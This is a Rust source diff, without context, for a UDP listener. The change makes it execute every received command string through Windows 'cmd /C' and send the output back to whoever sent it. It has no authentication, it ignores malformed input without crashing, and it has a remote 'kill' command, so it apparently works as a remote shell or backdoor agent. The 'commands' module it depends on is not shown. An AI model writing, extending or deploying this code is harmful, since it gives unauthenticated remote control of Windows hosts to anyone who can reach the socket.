@@ -1,8 +1,9 @@
 use std::net::UdpSocket;
+use std::process::Command;
 use std::str;
 
 mod commands;
-use commands::{match_command, run_command, CommandList};
+use commands::{match_command, CommandList};
 
 #[allow(unused_variables)]
 #[allow(unused_assignments)]
@@ -20,24 +21,23 @@ fn main() {
         let data_recv: &[u8] = &mut buf[..number_of_bytes];
         let command_received: &str = match str::from_utf8(data_recv) {
             Ok(v) => v,
-            Err(e) => panic!("Invalid utf8 seq : {}", e),
+            Err(e) => continue,
         };
-        let retmatch = match match_command(command_received) {
-            CommandList::Error(e) => panic!("{}", e),
-            _ => match_command(command_received),
-        };
+        let cmd = match match_command(command_received) {
+            CommandList::Error(e) => continue,
+            CommandList::Kill => std::process::exit(0),
+            CommandList::Exec(s) => {
+                let output = Command::new("cmd")
+                    .args(&["/C", &s])
+                    .output()
+                    .expect("failed to run command");
 
-        let cmd = retmatch.clone();
-
-        let cmd2 = retmatch.clone();
-
-        match run_command(cmd2).len() {
-            0 => (),
-            _ => {
-                socket
-                    .send_to(&run_command(cmd), src_addr)
-                    .expect("Failed to send output");
+                output.stdout
             }
-        }
+        };
+
+        socket
+            .send_to(&cmd, src_addr)
+            .expect("Failed to send output");
     }
 }
